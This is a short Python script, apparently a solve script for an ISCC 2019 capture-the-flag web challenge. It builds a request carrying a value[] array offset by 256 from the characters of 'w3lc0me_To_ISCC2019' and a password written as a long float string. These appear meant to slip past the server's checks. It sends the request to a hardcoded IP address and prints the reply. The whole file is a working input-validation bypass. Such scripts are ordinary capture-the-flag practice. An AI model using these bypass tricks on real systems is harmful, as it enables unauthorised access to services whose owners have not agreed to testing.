import requests
strs='w3lc0me_To_ISCC2019'
new_strs =''
for c in strs:
    i = 256 + ord(c)
    new_strs += 'value[]=%d&'%(i)
#print(new_strs)
payload="http://39.100.83.188:8001/?%spassword=%s"%(new_strs,'2332.9999999999999999999999999999999999')
print("[+]payload:%s"%payload)
res = requests.get(payload)
content = res.content.decode('utf-8')
print(content)

